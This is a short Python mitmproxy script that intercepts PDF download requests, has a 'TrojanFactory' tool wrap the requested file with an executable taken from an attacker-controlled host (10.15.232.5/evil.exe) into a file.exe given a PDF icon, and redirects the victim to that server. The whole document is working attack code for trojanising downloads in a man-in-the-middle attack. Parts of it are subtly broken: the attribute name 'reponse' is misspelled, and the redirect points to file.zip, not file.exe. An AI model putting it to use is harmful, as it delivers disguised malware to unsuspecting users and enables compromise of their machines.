import mitmproxy
import subprocess

def request(flow):
 #code to handle request flows
 if flow.request.host != "10.15.232.5" and flow.request.pretty_url.endswith(".pdf"):
     print("[+] Got an intriguing flow")

     front_file = flow.request.pretty_url + "#"

     subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.15.232.5/evil.exe -o /var/www/html/file.exe# -i /root/Downloads/pdf.ico", shell=True)

     flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
